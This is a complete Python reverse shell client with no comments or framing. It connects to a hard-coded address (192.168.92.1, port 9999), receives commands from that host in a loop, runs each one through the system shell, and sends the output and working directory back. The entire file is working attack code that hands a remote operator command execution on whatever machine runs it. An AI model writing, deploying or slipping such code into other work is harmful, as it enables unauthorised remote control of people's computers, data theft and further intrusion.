import socket
import os
import subprocess

s=socket.socket()
host = '192.168.92.1'
port=9999
s.connect((host, port))

while True:
    data = s.recv(2048)
    data = data.decode("utf-8")
    if data[:2] == 'cd':
        os.chdir(data[3:])
    if len(data) > 0:
        if data == 'quit':
            break
        cmd = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + '\n' + str(os.getcwd()) + '> '))
        print(output_str)

s.close()